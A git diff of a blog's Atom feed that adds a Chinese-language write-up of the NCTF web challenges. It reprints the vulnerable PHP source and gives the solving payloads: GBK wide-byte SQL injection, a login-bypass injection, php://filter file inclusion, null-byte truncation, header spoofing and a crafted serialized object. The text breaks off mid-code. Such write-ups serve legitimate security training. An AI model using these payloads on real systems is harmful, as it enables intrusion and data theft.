@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://zer0yu.github.io/"/>
-  <updated>2017-02-04T01:12:53.000Z</updated>
+  <updated>2017-10-24T08:05:10.532Z</updated>
   <id>http://zer0yu.github.io/</id>
   
   <author>
@@ -14,6 +14,178 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>南京邮电CTF题解</title>
+    <link href="http://zer0yu.github.io/2017/10/24/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF%E9%A2%98%E8%A7%A3/"/>
+    <id>http://zer0yu.github.io/2017/10/24/南京邮电CTF题解/</id>
+    <published>2017-10-24T08:02:49.000Z</published>
+    <updated>2017-10-24T08:05:10.532Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>nctf{flag_admiaanaaaaaaaaaaa}</p>
+<h4 id="php的弱类型加MD5碰撞"><a href="#php的弱类型加MD5碰撞" class="headerlink" title="php的弱类型加MD5碰撞"></a>php的弱类型加MD5碰撞</h4><p>首先考察post提交数据，然后考察md5碰撞，MD5加密QNKCDZ0可以看到是0exxxxxxxxx之类的字符，你只需要找到一个字符串，md5加密后是0e开头就好了。例如： aabg7XSs</p>
+<p>flag nctf{md5_collision_is_easy}</p>
+<h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><p>考察html中的一些知识，在此直接用开发者工具修改即可</p>
+<p>nctf{follow_me_to_exploit}</p>
+<h4 id="基本图片隐写术"><a href="#基本图片隐写术" class="headerlink" title="基本图片隐写术"></a>基本图片隐写术</h4><p>macos下类似winhex的软件有<a href="http://ridiculousfish.com/hexfiend/" target="_blank" rel="external">http://ridiculousfish.com/hexfiend/</a></p>
+<p>nctf{photo_can_also_hid3_msg}</p>
+<h4 id="源码分析进阶"><a href="#源码分析进阶" class="headerlink" title="源码分析进阶"></a>源码分析进阶</h4><p>访问连接，没看出端倪，直接用burpsuite的spider模块爬了一下，结果发现404.html，访问之后查看源代码，进而发现端倪。</p>
+<p>nctf{this_is_a_fl4g}</p>
+<h4 id="js的AAencode"><a href="#js的AAencode" class="headerlink" title="js的AAencode"></a>js的AAencode</h4><p>其实已经提示是AAencode了，想办法解密就行。比如你可以再<a href="http://tool.isex.ren/aadecode" target="_blank" rel="external">http://tool.isex.ren/aadecode</a>这个网站进行解密。机密结果就是flag（有人说浏览器打开是乱码，这样的话你wget下载，然后记事本打开就行）</p>
+<p>alert(“nctf{javascript_aaencode}”)</p>
+<h4 id="单身拼手速"><a href="#单身拼手速" class="headerlink" title="单身拼手速"></a>单身拼手速</h4><p>我觉得是题目没有出好，我直接在burpsuite中抓包就看到了flag</p>
+<p>当然也可能是出好了，考察的就是跳转</p>
+<p>nctf{yougotit_script_now}</p>
+<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>一看就知道是改referer，因为在http头中来源地就是这个参数，在hackbar中修改了就行。</p>
+<p>nctf{http_referer}</p>
+<h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpfunction CLsI($ZzvSWE) &#123;    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);    &#125;    return $ZzvSWE;&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</div></pre></td></tr></table></figure>
+<p>修改为如下代码，运行即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">function CLsI($ZzvSWE) &#123;</div><div class="line"></div><div class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</div><div class="line"></div><div class="line">    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</div><div class="line"></div><div class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return $ZzvSWE;</div><div class="line"></div><div class="line">&#125;echo(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</div></pre></td></tr></table></figure>
+<p>其实我觉得这个不是在考代码审计，因为你echo一下就有flag了。但是还是说下这个解密。具体参考这个文章<a href="https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html" target="_blank" rel="external">https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html</a></p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>参考如下文章，构造<a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="external">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></p>
+<p><a href="http://www.2cto.com/article/201311/258420.html" target="_blank" rel="external">http://www.2cto.com/article/201311/258420.html</a></p>
+<p>实在不会我们还有工具：<a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="external">https://github.com/D35m0nd142/LFISuite</a></p>
+<h4 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h4><p>考察302跳转：<a href="http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html</a></p>
+<p>做题用burp抓包放repeater就行，其实用curl也可以</p>
+<p>例如我用curl命令来做一下，其实这个源码也很好猜的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">➜  ~ curl -i http://chinalover.sinaapp.com/web9/index.php</div><div class="line"></div><div class="line">HTTP/1.1 302 Found</div><div class="line"></div><div class="line">Server: sae</div><div class="line"></div><div class="line">Date: Mon, 11 Sep 2017 08:29:53 GMT</div><div class="line"></div><div class="line">Content-Type: text/html</div><div class="line"></div><div class="line">Content-Length: 0</div><div class="line"></div><div class="line">Connection: keep-alive</div><div class="line"></div><div class="line">flag: nctf&#123;this_is302redirect&#125;</div><div class="line"></div><div class="line">Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</div><div class="line"></div><div class="line">Via: 1566</div></pre></td></tr></table></figure>
+<h4 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h4><p>提示了文件下载，可以联想到任意文件下载漏洞，这样的话我们可以顺利的下载网站的源码进行审计的。我们先下载download.php（文件名是base64编码的），之后我们可以看到还有一个hereiskey.php，继续下载即可得到flag:nctf{download_any_file_666}</p>
+<p>download.php的源码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line">include(&quot;hereiskey.php&quot;);</div><div class="line"></div><div class="line">$url=base64decode($GET[url]);</div><div class="line"></div><div class="line">if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123;</div><div class="line"></div><div class="line">	$file_size = filesize($url);</div><div class="line"></div><div class="line">	header ( &quot;Pragma: public&quot; );</div><div class="line"></div><div class="line">	header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; );</div><div class="line"></div><div class="line">	header ( &quot;Cache-Control: private&quot;, false );</div><div class="line"></div><div class="line">	header ( &quot;Content-Transfer-Encoding: binary&quot; );</div><div class="line"></div><div class="line">	header ( &quot;Content-Type:audio/mpeg MP3&quot;);</div><div class="line"></div><div class="line">	header ( &quot;Content-Length: &quot; . $file_size);</div><div class="line"></div><div class="line">	header ( &quot;Content-Disposition: attachment; filename=&quot;.$url);</div><div class="line"></div><div class="line">	echo(file_get_contents($url));</div><div class="line"></div><div class="line">	exit;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">else &#123;</div><div class="line"></div><div class="line">	echo &quot;Access Forbidden!&quot;;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h4><p>看到提示0==not，果断抓包把0改成1，然后就有了flag</p>
+<p>flag:nctf{cookie_is_different_from_session}</p>
+<h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>提示让看robots.txt</p>
+<p>然后看到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpif($GET[id]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $id = intval($GET[id]);  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));  if ($_GET[id]==1024) &#123;      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;  &#125;  else&#123;    echo($query[content]);  &#125;&#125;?&gt;</div></pre></td></tr></table></figure>
+<p>其实在此处是考察mysql中的一个精度问题，比如2014.1虽然在php中哦按段不等于2014，但是再查询时，加入mysql设置id为整型，那么2014.1就会变成2014。</p>
+<p>the flag is:nctf{query_in_mysql}</p>
+<h4 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h4><p>其实看到连接就知道是gbk的问题了，后面提示也有</p>
+<p>your sql:select id,title from news where id = ‘2’</p>
+<p>gbk_sql_injection</p>
+<p>关于宽字节注入问题可以看这个文章：</p>
+<p><a href="http://www.91ri.org/8611.html" target="_blank" rel="external">http://www.91ri.org/8611.html</a></p>
+<p><a href="https://www.2cto.com/article/201301/182881.html" target="_blank" rel="external">https://www.2cto.com/article/201301/182881.html</a></p>
+<p>你可以手动来做：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=ß&apos; union select 1,database() #</div></pre></td></tr></table></figure>
+<p>your sql:select id,title from news where id = ‘運’ union select 1,database() #’</p>
+<p>sae-chinalover</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23</div></pre></td></tr></table></figure>
+<p>your sql:select id,title from news where id = ‘id=運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #’</p>
+<p>ctf,ctf2,ctf3,ctf4,news</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23</div></pre></td></tr></table></figure>
+<p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 #’</p>
+<p>id,flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(id,0x3a,flag) from ctf4 %23</div></pre></td></tr></table></figure>
+<p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(id,0x3a,flag) from ctf4 #’</p>
+<p>1:nctf{gbk_3sqli}</p>
+<h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h4><p>看标题就知道这个是在考察00截断</p>
+<p>分析下这段代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (isset ($GET[&apos;nctf&apos;])) &#123;        if (@ereg (&quot;^[1-9]+$&quot;, $GET[&apos;nctf&apos;]) === FALSE)            echo &apos;必须输入数字才行&apos;;        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)               die(&apos;Flag: &apos;.$flag);        else            echo &apos;骚年，继续努力吧啊~&apos;;    &#125;</div></pre></td></tr></table></figure>
+<p>ereg(mode, string subject, array regs);</p>
+<p>mode：正则表达式（preg_match中的mode必须以’/‘开始和“/”结束）</p>
+<p>subject： 需要验证的字符串</p>
+<p>matchs/regs： 匹配后得到的结果。以数组的形式存储</p>
+<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
+<p>构造：</p>
+<p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu</a></p>
+<p>网上也有说构造</p>
+<p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=</a></p>
+<p>这个原因是因为报错并返回null（多亏了wonderkun大佬）</p>
+<h4 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h4><p>这个题跟上面那个是不一样的，注意是===</p>
+<p>所以姿势如下：<a href="http://www.cnblogs.com/weidiao/p/6821812.html" target="_blank" rel="external">http://www.cnblogs.com/weidiao/p/6821812.html</a></p>
+<p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c" target="_blank" rel="external">http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c</a></p>
+<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>看下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</div><div class="line"></div><div class="line">    &lt;?php</div><div class="line"></div><div class="line">    extract($_POST);</div><div class="line"></div><div class="line">    if ($pass == $thepassword_123) &#123; ?&gt;</div><div class="line"></div><div class="line">        &lt;div class=&quot;alert alert-success&quot;&gt;</div><div class="line"></div><div class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</div><div class="line"></div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">    &lt;?php &#125; ?&gt;</div><div class="line"></div><div class="line">&lt;?php &#125; ?&gt;</div></pre></td></tr></table></figure>
+<p>extract()出现的问题，详情见：</p>
+<p><a href="http://www.cnblogs.com/sqyysec/p/6926095.html" target="_blank" rel="external">http://www.cnblogs.com/sqyysec/p/6926095.html</a></p>
+<p>构造：</p>
+<p>pass=1&amp;thepassword_123=1 post方式提交就行（使用hackbar和burp均可）</p>
+<h4 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h4><p><a href="http://way.nuptzj.cn/php/index.txt" target="_blank" rel="external">http://way.nuptzj.cn/php/index.txt</a>看到源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</div><div class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</div><div class="line">  exit();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line">if($_GET[id] == &quot;hackerDJ&quot;)</div><div class="line">&#123;</div><div class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</div><div class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>id的内容要跟hackerDJ不相同，但是urldecode之后要和hackerDJ相同</p>
+<p>其实在此处考察的是$_GET[]本身就有urldecode的功能，所以构造：%2568ackerDJ即可</p>
+<p>nctf{php_is_best_language}</p>
+<h4 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h4><p>看到这句“管理系统只能在本地登陆”就知道了</p>
+<p>抓包增加：X-Forwarded-For: 127.0.0.1</p>
+<p>nctf{happy_http_headers}</p>
+<h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>flag在响应头中，用burp看下就行</p>
+<p>nctf{tips_often_hide_here}</p>
+<h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>这题网上大多都写错了，有必要一写。</p>
+<p>首先我们上传1.png（但实际文件内容写的是php一句话）</p>
+<p>上传成功，我们可以知道与文件内容无关。重要的是：最终路径是拼接了 dir 和 filename 的，那么我们在 dir 处 00 截断为 .php 即可绕过。</p>
+<p>具体的方式为用burp在hex中将空格20修改为00</p>
+<p>nctf{welcome_to_hacks_world}</p>
+<h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>知道了是post注入之后我们看代码就好</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = trim($_POST[user]);</div><div class="line">  $pass = md5(trim($_POST[pass]));</div><div class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</div><div class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  if($query[user]==&quot;admin&quot;) &#123;</div><div class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</div><div class="line">  &#125;</div><div class="line">  if($query[user] != &quot;admin&quot;) &#123;</div><div class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">echo $query[user];</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>trim()是去除两侧空格，重点在于依据下面这句进行构造</p>
+<p>$sql=”select user from ctf where (user=’”.$user.”‘) and (pw=’”.$pass.”‘)”;</p>
+<p>构造：admin’)#即可， ‘)用来分别用来闭合 #用来把后面给注释掉</p>
+<p>nctf{ni_ye_hui_sql?}</p>
+<h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h4><p>来继续审计：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$pass=@$_POST[&apos;pass&apos;];</div><div class="line">$pass1=***********;//被隐藏起来的密码</div><div class="line">if(isset($pass))</div><div class="line">&#123;</div><div class="line">if(@!strcmp($pass,$pass1))&#123;</div><div class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;the pass is wrong!&quot;;</div><div class="line">&#125;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;please input pass!&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>strcmp() 函数比较两个字符串。依据提示我们需要构造pass与pass1相等才行，但是我又不知道pass1，但是strcmp()比较，若相等返回0！但是null和0是等价的，所以我们让其返回null即可。构造：pass[]=hack 把这个post上去就行</p>
+<p>flag:nctf{strcmp_is_n0t_3afe}</p>
+<h4 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h4><p>审计！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> function noother_says_correct($number)</div><div class="line">&#123;</div><div class="line">        $one = ord(&apos;1&apos;);//ord() 函数返回字符串的首个字符的 ASCII 值。</div><div class="line">        $nine = ord(&apos;9&apos;);</div><div class="line">        for ($i = 0; $i &lt; strlen($number); $i++)</div><div class="line">        &#123;   </div><div class="line">                $digit = ord($number&#123;$i&#125;);</div><div class="line">                if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">                &#123;</div><div class="line">                        return false;</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">           return $number == &apos;54975581388&apos;;</div><div class="line">&#125;</div><div class="line">$flag=&apos;*******&apos;;</div><div class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</div><div class="line">    echo $flag;</div><div class="line">else </div><div class="line">    echo &apos;access denied&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>要求：id中的字符串不能有数字，而想得到flag又要进去的是要数字</p>
+<p>构造：54975581388的16进制 0xccccccccc</p>
+<p>提交得到flag:nctf{follow_your_dream}</p>
+<h4 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h4><p>其中涉及了URL编码和base64编码，burp抓包修改成admin就行</p>
+<p>nctf{reset_password_often_have_vuln}</p>
+<h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title=".php反序列化"></a>.php反序列化</h4><p>审计！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class just4fun &#123;</div><div class="line">    var $enter;</div><div class="line">    var $secret;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</div><div class="line">    $pass = $_GET[&apos;pass&apos;];</div><div class="line"></div><div class="line">    if(get_magic_quotes_gpc())&#123;</div><div class="line">        $pass=stripslashes($pass);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $o = unserialize($pass);</div><div class="line"></div><div class="line">    if ($o) &#123;</div><div class="line">        $o-&gt;secret = &quot;*&quot;;</div><div class="line">        if ($o-&gt;secret === $o-&gt;enter)</div><div class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</div><div class="line">        else </div><div class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</div><div class="line">    &#125;</div><div class="line">    else echo &quot;are you trolling?&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>题目的意思就是一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用a=&amp;b</p>
+<p>（这可以当成一个专题讲讲）</p>
+<p>1.php的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line"></div><div class="line">class just4fun &#123;  </div><div class="line"></div><div class="line">    var $enter;  </div><div class="line"></div><div class="line">    var $secret;  </div><div class="line"></div><div class="line">    function just4fun()  </div><div class="line"></div><div class="line">    &#123;  </div><div class="line"></div><div class="line">        $this-&gt;enter=&amp;$this-&gt;secret;  </div><div class="line"></div><div class="line">    &#125;  </div><div class="line"></div><div class="line">&#125;  </div><div class="line"></div><div class="line">echo serialize(new just4fun());  </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>执行一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  Desktop php 1.php</div><div class="line"></div><div class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</div></pre></td></tr></table></figure>
+<p>构造：</p>
+<p><a href="http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}" target="_blank" rel="external">http://115.28.150.176/php1/index.php?pass=O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}</a></p>
+<p>得到flag</p>
+<p>nctf{serialize_and_unserialize}</p>
+<h4 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h4><p>审计！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">#GOAL: login as admin,then get the flag;</div><div class="line">error_reporting(0);</div><div class="line">require &apos;db.inc.php&apos;;</div><div class="line"></div><div class="line">function clean($str)&#123;</div><div class="line">	if(get_magic_quotes_gpc())&#123;//当 magic_quotes_gpc 打开时，所有的 ’ (单引号), ” (双引号),                   \ (反斜线) and 空字符会自动转为含有反斜线的转义字符</div><div class="line">		$str=stripslashes($str);//与stripslashes()搭配使用，此函数是删除所有的\的 </div><div class="line">	&#125;</div><div class="line">	return htmlentities($str, ENT_QUOTES);//htmlentities($str, ENT_QUOTES)是指编码所有的双引号和单引号</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</div><div class="line">$password = 